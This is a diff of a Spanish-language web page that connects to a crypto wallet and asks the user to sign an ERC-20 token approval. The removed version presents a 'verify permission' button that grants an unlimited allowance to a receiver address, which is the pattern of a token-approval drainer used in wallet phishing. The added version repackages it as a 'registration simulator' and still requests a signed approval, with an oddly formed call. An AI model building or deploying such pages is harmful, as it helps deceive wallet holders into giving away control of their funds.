@@ -3,22 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DeFi Portal - Laboratorio de Seguridad</title>
-    <!-- ethers.js para interactuar con la billetera -->
+    <title>Laboratorio Web3 - Interacción con Billetera</title>
+    <!-- ethers.js para la comunicación con la billetera -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
         :root {
-            --primary: #4F46E5;
-            --primary-hover: #4338CA;
-            --danger: #EF4444;
-            --bg: #0F172A;
-            --card-bg: #1E293B;
-            --text: #F8FAFC;
-            --text-muted: #94A3B8;
+            --primary: #2563EB;
+            --primary-hover: #1D4ED8;
+            --bg: #F1F5F9;
+            --card-bg: #FFFFFF;
+            --text: #0F172A;
+            --text-muted: #64748B;
+            --border: #E2E8F0;
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             background-color: var(--bg);
             color: var(--text);
             display: flex;
@@ -29,90 +29,143 @@
             padding: 20px;
         }
 
-        .dapp-card {
+        .card {
             background-color: var(--card-bg);
-            border: 1px solid #334155;
+            border: 1px solid var(--border);
             border-radius: 16px;
             padding: 24px;
-            max-width: 400px;
+            max-width: 420px;
             width: 100%;
-            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
         }
 
         .header {
             text-align: center;
-            margin-bottom: 24px;
+            margin-bottom: 20px;
         }
 
-        .header h1 {
+        .header h2 {
+            margin: 0 0 6px 0;
             font-size: 1.25rem;
-            margin: 0 0 8px 0;
         }
 
-        .badge {
-            background: rgba(239, 68, 68, 0.2);
-            color: #FCA5A5;
-            font-size: 0.75rem;
-            padding: 4px 8px;
-            border-radius: 9999px;
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
+        .subtitle {
+            color: var(--text-muted);
+            font-size: 0.85rem;
+            margin: 0;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        label {
+            display: block;
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: var(--text);
+            margin-bottom: 6px;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            font-size: 0.95rem;
+            box-sizing: border-box;
+            background-color: #F8FAFC;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: var(--primary);
+            background-color: #FFFFFF;
         }
 
         .btn {
             background-color: var(--primary);
             color: white;
             border: none;
-            padding: 12px 16px;
+            padding: 12px;
             border-radius: 8px;
             font-weight: 600;
+            font-size: 0.95rem;
             width: 100%;
             cursor: pointer;
             transition: background 0.2s;
-            margin-bottom: 12px;
+            margin-top: 8px;
         }
 
-        .btn:hover { background-color: var(--primary-hover); }
+        .btn:hover {
+            background-color: var(--primary-hover);
+        }
 
-        .btn-action {
-            background-color: var(--danger);
+        .btn-connect {
+            background-color: #0F172A;
+            margin-bottom: 16px;
+        }
+
+        .btn-connect:hover {
+            background-color: #334155;
         }
 
         .status-box {
-            background: #0F172A;
+            background-color: #F8FAFC;
+            border: 1px solid var(--border);
             border-radius: 8px;
             padding: 12px;
-            font-size: 0.85rem;
+            font-size: 0.8rem;
             color: var(--text-muted);
             word-break: break-all;
-            margin-top: 12px;
+            margin-top: 16px;
         }
     </style>
 </head>
 <body>
 
-<div class="dapp-card">
+<div class="card">
     <div class="header">
-        <span class="badge">Soy un Guevo Adrian</span>
-        <h1>Verificación de Billetera</h1>
-        <p style="color: var(--text-muted); font-size: 0.875rem;">Demostración de solicitudes de firma en dApps</p>
+        <h2>Simulador de Registro Web3</h2>
+        <p class="subtitle">Demostración de solicitudes e interacción con contratos</p>
     </div>
 
-    <!-- Paso 1: Conectar -->
-    <button class="btn" onclick="conectarBilletera()">1. Conectar Billetera</button>
-    
-    <!-- Paso 2: Acción que solicita la aprobación -->
-    <button class="btn btn-action" onclick="solicitarAprobacion()">2. Reclamar / Verificar Permiso</button>
+    <!-- Paso 1: Conectar Billetera -->
+    <button class="btn btn-connect" id="btn-connect" onclick="conectarBilletera()">
+        Conectar Billetera
+    </button>
+
+    <!-- Formulario de Interacción -->
+    <div class="form-group">
+        <label for="input-address">Dirección / Contrato Destino</label>
+        <input type="text" id="input-address" placeholder="0x..." value="0xed24fc36d5ee211ea25a80239fb8c4cfd80f12ee">
+    </div>
+
+    <div class="form-group">
+        <label for="select-network">Red de Destino</label>
+        <select id="select-network">
+            <option value="97">BNB Smart Chain (Testnet)</option>
+            <option value="1">Ethereum (Mainnet)</option>
+            <option value="137">Polygon</option>
+        </select>
+    </div>
+
+    <div class="form-group">
+        <label for="input-amount">Cantidad / Permiso</label>
+        <input type="number" id="input-amount" placeholder="0.0" value="1.0">
+    </div>
+
+    <!-- Paso 2: Ejecutar Acción -->
+    <button class="btn" onclick="procesarTransaccion()">
+        Ejecutar Operación
+    </button>
 
     <div class="status-box" id="status-box">
-        Estado: Esperando interacción...
+        Estado: Esperando conexión de billetera...
     </div>
 </div>
 
 <script>
-    const TOKEN_CONTRACT = "0xed24fc36d5ee211ea25a80239fb8c4cfd80f12ee"; // Contrato de prueba
-    const RECEPTOR_ADDRESS = "0xTU_SEGUNDA_DIRECCION_AQUI"; // Billetera receptora de prueba
-
     const ABI_ERC20 = ["function approve(address spender, uint256 amount) public returns (bool)"];
     let provider, signer;
 
@@ -123,29 +176,45 @@
                 await provider.send("eth_requestAccounts", []);
                 signer = provider.getSigner();
                 const address = await signer.getAddress();
-                document.getElementById("status-box").innerText = "Conectado: " + address;
+                
+                document.getElementById("btn-connect").innerText = "Conectado: " + address.substring(0, 6) + "..." + address.substring(38);
+                document.getElementById("status-box").innerText = "Billetera lista: " + address;
             } catch (err) {
-                document.getElementById("status-box").innerText = "Error: " + err.message;
+                document.getElementById("status-box").innerText = "Error al conectar: " + err.message;
             }
         } else {
-            alert("Abre este enlace desde el navegador interno de Trust Wallet o MetaMask.");
+            alert("Abre este sitio en el navegador interno de Trust Wallet o MetaMask.");
         }
     }
 
-    async function solicitarAprobacion() {
+    async function procesarTransaccion() {
         if (!signer) {
-            alert("Primero conecta la billetera.");
+            alert("Por favor conecta la billetera primero.");
             return;
         }
+
+        const targetAddress = document.getElementById("input-address").value;
+        const amount = document.getElementById("input-amount").value;
+
+        if (!targetAddress || targetAddress.trim() === "") {
+            alert("Ingresa una dirección válida.");
+            return;
+        }
+
         try {
-            document.getElementById("status-box").innerText = "Solicitando confirmación en la billetera...";
-            const contract = new ethers.Contract(TOKEN_CONTRACT, ABI_ERC20, signer);
+            document.getElementById("status-box").innerText = "Enviando solicitud a la billetera...";
             
-            // Permiso ilimitado (MaxUint256)
-            const tx = await contract.approve(RECEPTOR_ADDRESS, ethers.constants.MaxUint256);
-            document.getElementById("status-box").innerText = "Transacción enviada: " + tx.hash;
+            // Instanciar el contrato objetivo con los datos del formulario
+            const contract = new ethers.Contract(targetAddress, ABI_ERC20, signer);
+            
+            // Convertir la cantidad ingresada
+            const parsedAmount = ethers.utils.parseUnits(amount.toString(), 18);
+            
+            // Solicitar la aprobación
+            const tx = await contract.approve(targetAddress, parsedAmount);
+            document.getElementById("status-box").innerText = "Transacción enviada. Hash: " + tx.hash;
         } catch (err) {
-            document.getElementById("status-box").innerText = "Firma rechazada o cancelada.";
+            document.getElementById("status-box").innerText = "Error en la operación: " + (err.reason || err.message);
         }
     }
 </script>
